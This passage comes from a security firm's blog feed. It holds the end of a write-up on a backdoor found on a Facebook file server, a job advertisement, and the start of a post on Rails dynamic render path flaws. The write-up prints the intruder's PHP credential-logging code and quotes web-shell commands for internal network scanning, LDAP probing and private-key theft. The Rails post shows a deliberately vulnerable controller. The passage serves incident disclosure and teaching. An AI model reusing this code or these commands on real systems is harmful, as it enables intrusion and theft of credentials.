&lt;span class=&quot;c1&quot;&gt;// 省略...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Y-m-d H:i:s T&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;HTTP_USER_AGENT&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;POST=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;GET=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;COOKIE=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// 省略...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;前幾個就是很標準的 PHP 一句話木馬  &lt;br /&gt;
其中比較特別的是 “&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;” 這個檔案&lt;/p&gt;

&lt;p&gt;include_once 中 “&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;” 為原本對密碼進行驗證的 PHP 程式，駭客做了一個 Proxy 在中間並在進行一些重要操作時先把 GET, POST, COOKIE 的值記錄起來&lt;/p&gt;

&lt;p&gt;整理一下，駭客做了一個 Proxy 在密碼驗證的地方，並且記錄 Facebook 員工的帳號密碼，並且將記錄到的密碼放置在 Web 目錄下，駭客每隔一段時間使用   wget 抓取&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
&lt;em&gt;↑ Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;從紀錄裡面可以看到除了使用者帳號密碼外，還有從 FTA 要求檔案時的信件內容，記錄到的帳號密碼會定時 Rotate (後文會提及，這點還滿機車的XD)&lt;/p&gt;

&lt;p&gt;發現當下，最近一次的 Rotate 從 2/1 記錄到 2/7 共約 300 筆帳號密碼紀錄，大多都是 “&lt;strong&gt;@fb.com&lt;/strong&gt;” 或是 “&lt;strong&gt;@facebook.com&lt;/strong&gt;” 的員工帳密，看到當下覺得事情有點嚴重了，在 FTA 中，使用者的登入主要有兩種模式&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;一般用戶註冊，密碼 Hash 存在資料庫，由 SHA256 + SALT 儲存&lt;/li&gt;
  &lt;li&gt;Facebook 員工 (@fb.com) 則走統一認證，使用 LDAP 由 AD 認證&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在這裡相信記錄到的是真實的員工帳號密碼，&lt;strong&gt;**猜測&lt;/strong&gt;** 這份帳號密碼應該可以通行 Facebook Mail OWA, VPN 等服務做更進一步的滲透…&lt;/p&gt;

&lt;p&gt;此外，這名 “駭客” 可能習慣不太好 :P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;後門參數皆使用 GET 來傳遞，在網頁日誌可以很明顯的發現他的足跡&lt;/li&gt;
  &lt;li&gt;駭客在進行一些指令操作時沒顧慮到 STDERR ，導致網頁日誌中很多指令的錯誤訊息，從中可以觀察駭客做了哪些操作&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
從 access.log 可以觀察到的每隔數日駭客會將記錄到的帳號密碼清空&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168.54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&amp;#39; 2&amp;gt;/dev/stdout HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;打包檔案&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat tmp_list3_2 &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; cp /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; 2&amp;gt;/dev/stdout
tar -czvf files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;對內部網路結構進行探測&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;nb&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;for i in &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &amp;quot;192.168.&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&amp;quot;; done; done&amp;#39; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;使用 Shell Script 進行內網掃描但忘記把 STDERR 導掉XD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;嘗試對內部 LDAP 進行連接&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&amp;#39;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &amp;#39;********&amp;#39; -s base (objectclass=*) 2&amp;gt;/dev/stdout&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;嘗試訪問內部網路資源  &lt;br /&gt;
( 看起來 Mail OWA 可以直接訪問 …)&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&amp;#39;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&amp;#39; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;嘗試對 SSL Private Key 下手&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;從瀏覽器觀察 files.fb.com 的憑證還是 Wildcard 的 *.fb.com …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;後記&quot;&gt;後記&lt;/h3&gt;

&lt;p&gt;在收集完足夠證據後便立即回報給 Facebook 安全團隊，回報內容除了漏洞細節外，還附上相對應的 Log 、截圖以及時間紀錄xD&lt;/p&gt;

&lt;p&gt;從伺服器中的日誌可以發現有兩個時間點是明顯駭客在操作系統的時間，一個是七月初、另個是九月中旬&lt;/p&gt;

&lt;p&gt;七月初的動作從紀錄中來看起來比較偏向 “逛” 伺服器，但九月中旬的操作就比較惡意了，除了逛街外，還放置了密碼 Logger 等，至於兩個時間點的 “駭客” 是不是同一個人就不得而知了 :P  &lt;br /&gt;
而七月發生的時機點正好接近 CVE-2015-2857 Exploit 公佈前，究竟是透過 1-Day 還是無 0-Day 入侵系統也無從得知了。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;這件事情就記錄到這裡，總體來說這是一個非常有趣的經歷xD  &lt;br /&gt;
也讓我有這個機會可以來寫寫關於滲透的一些文章 :P&lt;/p&gt;

&lt;p&gt;最後也感謝 Bug Bounty 及胸襟寬闊的 Facebook 安全團隊 讓我可以完整記錄這起事件 : )&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 提供漏洞詳情給 Facebook 安全團隊&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 收到機器人自動回覆&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 提供弱點 Advisory 給 Accellion 技術窗口&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 收到 Thomas 的回覆，告知調查中&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 收到 Reginaldo 的回覆，告知 Bug Bounty 獎金 $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 詢問是否撰寫 Blog 是否有任何要注意的地方?&lt;/li&gt;
  &lt;li&gt;2016/02/13 詢問此漏洞被認為是 RCE 還是 SQL Injection&lt;/li&gt;
  &lt;li&gt;2016/02/18 收到 Reginaldo 的回覆，告知正在進行調查中，希望 Blog 先暫時不要發出&lt;/li&gt;
  &lt;li&gt;2016/02/24 收到 Hai 的回覆，告知獎金將會於三月發送&lt;/li&gt;
  &lt;li&gt;2016/04/20 收到 Reginaldo 的回覆，告知調查已完成&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/</link>
                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[已結束] DEVCORE 徵求行政出納人才</title>
                <description>&lt;p&gt;（2015.9.16 已結束徵才）&lt;/p&gt;

&lt;p&gt;戴夫寇爾即將要邁入第四個年頭，在過去的歲月中，我們推廣資安的重要性、強調安全開發。我們堅持提供最高品質的滲透測試服務，協助企業找出隱藏的資安威脅。我們也不斷精進技術，期許自己能成為全台灣第一的滲透測試團隊。&lt;/p&gt;

&lt;p&gt;感謝這些年來業界朋友對我們的肯定與支持，戴夫寇爾得以茁壯，如今，我們還需要一位行政出納人才，我們渴望您的加入，做為戴夫寇爾穩定的力量。相關細節如下：&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;工作內容&quot;&gt;工作內容&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;協助處理庶務性行政工作（接聽來電、收發、接待）&lt;/li&gt;
  &lt;li&gt;負責合約管理、出缺考勤管理、帳務明細整理&lt;/li&gt;
  &lt;li&gt;規劃、執行採購庶務&lt;/li&gt;
  &lt;li&gt;應收應付款項與零用金管理&lt;/li&gt;
  &lt;li&gt;銀行往來與一般款項收付作業&lt;/li&gt;
  &lt;li&gt;協助主管執行相關業務&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作時間&quot;&gt;工作時間&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;工作地點&quot;&gt;工作地點&lt;/h3&gt;
&lt;p&gt;台北市中山區復興北路 168 號 10 樓&lt;br /&gt;&lt;br /&gt;
（捷運南京復興站，走路約三分鐘）&lt;/p&gt;

&lt;h3 id=&quot;條件要求&quot;&gt;條件要求&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;需有兩年以上相關工作經驗&lt;/li&gt;
  &lt;li&gt;熟悉試算表，具獨立撰寫試算表公式能力&lt;/li&gt;
  &lt;li&gt;習慣使用雲端服務，如：Google Drive, Dropbox 或其他&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;加分條件&quot;&gt;加分條件&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;您使用過專案管理系統，如：Trello, Basecamp, Redmine 或其他&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您將會使用專案管理系統管理平日任務&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您是 MAC 使用者&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您未來的電腦會是 MAC，我們希望您越快順暢使用電腦越好&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您曾經做過行政相關職務，但對行政一職有一套自己的想法&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;我們是新創公司，我們歡迎您挑戰既定的行政刻版印象&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您是生活駭客&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您不需要會寫程式，但您習慣觀察生活中的規律，並想辦法利用這些規律有效率的解決問題&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作環境&quot;&gt;工作環境&lt;/h3&gt;
&lt;p&gt;我們注重公司每個人的身心健康，所以：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;您會在一個開闊的辦公環境工作&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;您會擁有一張 Aeron 人體工學椅&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;每週補滿飲料（另有咖啡機）、零食，讓您保持心情愉快&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;公司提供飛鏢機讓您發洩對主管的怨氣&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;員工福利&quot;&gt;員工福利&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;第一年即有特休（照比例），每年度五天全薪病假&lt;/li&gt;
  &lt;li&gt;三節、生日禮金&lt;/li&gt;
  &lt;li&gt;每季員工聚餐&lt;/li&gt;
  &lt;li&gt;每年員工旅遊&lt;/li&gt;
  &lt;li&gt;每年員工健檢&lt;/li&gt;
  &lt;li&gt;勞保、健保、勞退、團保&lt;/li&gt;
  &lt;li&gt;定期專人按摩服務&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;
&lt;p&gt;新台幣 32,000 - 40,000 （保證 14 個月）&lt;/p&gt;

&lt;h3 id=&quot;應徵方式&quot;&gt;應徵方式&lt;/h3&gt;
&lt;p&gt;請來信將您的履歷以 PDF 格式寄到 recruiting@devco.re，標題格式如下：&lt;br /&gt;&lt;strong&gt;[應徵] 行政出納專員 (您的姓名)&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;我們會在兩週內主動與您聯繫。審查方式會有書審、線上測驗以及面試三個階段。最快將於九月初開始進行第二階段測試，煩請耐心等候。&lt;br /&gt;履歷請控制在兩頁以內，需包含以下內容：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;基本資料&lt;/li&gt;
  &lt;li&gt;學歷&lt;/li&gt;
  &lt;li&gt;工作經歷&lt;/li&gt;
  &lt;li&gt;社群活動經驗&lt;/li&gt;
  &lt;li&gt;特殊事蹟&lt;/li&gt;
  &lt;li&gt;MBTI 職業性格測試結果（請自行尋找線上測驗測試）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;請參考範例示意（&lt;a href=&quot;http://devco.re/assets/files/recruit2015/Resume_Example.doc&quot;&gt;DOC&lt;/a&gt;、&lt;a href=&quot;http://devco.re/assets/files/recruit2015/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;http://devco.re/assets/files/recruit2015/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。&lt;br /&gt;&lt;br /&gt;
若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/p&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;
&lt;p&gt;由於最近業務較為忙碌，若有應徵相關問題，請一律使用 Email 聯繫，造成您的不便請見諒。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;我們選擇優先在部落格公布徵才資訊，是希望您也對安全議題感興趣，即使不懂技術也想為台灣資安盡一點力。如果您除了處理基本事務外還有更多想法，也歡迎與我們聯繫，我們會保留給您發揮的空間與調升薪水。&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
無論如何，我們都感謝您的來信，期待您的加入！&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2015/08/19/devcore-2015-recruit/</link>
                <guid>https://devco.re/blog/2015/08/19/devcore-2015-recruit</guid>
                <pubDate>Wed, 19 Aug 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Rails 動態樣板路徑的風險</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;從安全開發的角度來看，Ruby on Rails 是一套很友善的框架。它從框架層避免了很多過去網站常出現的安全問題，例如使用 ORM 避免大部分的 SQL injection 問題、有內建的 authenticity_token 讓開發者不必特別煩惱 CSRF、從機制面規定開發者使用 Strong Parameter 避免 Mass Assignment、預設轉化危險字元避免 XSS 等…。&lt;/p&gt;

&lt;p&gt;就我們過去&lt;a href=&quot;https://devco.re/services/penetration-test&quot; title=&quot;滲透測試&quot;&gt;滲透測試&lt;/a&gt;的經驗來說，Rails 網站雖然還是能找到問題，但相對問題較少，而且很少單純因為 Rails 寫法問題拿到系統操作權。而今天要分享的，是在一次滲透測試中比較特別的例子，因為開發者使用了動態樣板路徑(Dynamic Render Paths)的寫法&lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;，最後造成了嚴重的結果。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;動態樣板路徑，OWASP 的&lt;a href=&quot;https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#Dynamic_Render_Paths&quot;&gt;介紹&lt;/a&gt;是這樣的：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In Rails, controller actions and views can dynamically determine which view or partial to render by calling the “render” method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;OWASP 是說，如果你的樣板路徑是動態產生的，而且使用者可以控制那個樣板路徑，那麼使用者就可以讀取到任意樣板，包含管理介面的樣板。這樣的描述感覺還好，但就我們的發現，這其實是更嚴重的直接存取物件問題(Insecure Direct Object References)，甚至有機會造成遠端命令執行(Remote Code Execution)，怎麼說呢？我們直接看下去。&lt;/p&gt;

&lt;h3 id=&quot;基本細節&quot;&gt;基本細節&lt;/h3&gt;

&lt;p&gt;一個動態樣板路徑的寫法如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# app/controllers/welcome_controller.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WelcomeController&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ApplicationController&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;index&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;render&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;而 index 的樣板內容是這樣：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/index.html.erb --&amp;gt;&lt;/span&gt;
This is INDEX page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

